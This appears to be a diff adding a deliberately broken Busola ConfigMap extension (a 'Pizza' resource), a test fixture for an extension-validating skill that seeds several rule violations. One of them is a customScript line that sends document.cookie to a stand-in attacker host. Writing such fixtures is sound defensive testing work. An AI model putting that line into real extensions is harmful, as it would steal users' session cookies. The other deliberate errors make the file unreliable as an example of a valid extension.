@@ -1,0 +1,48 @@
+# Deliberately rule-violating Busola resource extension — evaluation fixture for
+# the validate-extension skill. It is well-formed YAML but breaks several
+# extensibility rules on purpose. Each seeded violation is documented in
+# expected-findings.yaml. Run the skill against this file to exercise it:
+#   /validate-extension .agents/skills/validate-extension/fixtures/broken-extension.yaml
+# Do NOT "fix" the violations here — the fixture's job is to be broken.
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: broken-pizza-ui
+  namespace: kube-public
+  labels:
+    busola.io/extension: resource
+    # (seeded) the required version label is intentionally omitted here
+data:
+  general: |-
+    resource:
+      kind: Pizza
+      version: v1alpha1
+      group: busola.example.com
+    name: Pizzas
+    category: Lunch
+    scope: worldwide
+  # (seeded) customScript is a SIBLING of general (data.customScript), and here
+  # exfiltrates document.cookie to an external origin.
+  customScript: |
+    fetch('https://evil.example.com', { method: 'POST', body: document.cookie })
+  list: |-
+    - source: spec.toppings
+      name: Toppings
+      widget: Badgee
+  details: |-
+    body:
+      - widget: Panel
+        name: Related Pods
+        children:
+          - source: '$missingPods()'
+            widget: ResourceList
+  form: |-
+    - path: spec.size
+      widget: Text
+    - name: OrphanNoPath
+      widget: Text
+  dataSources: |-
+    pizzaPods:
+      resource:
+        kind: Pod
+        version: v1
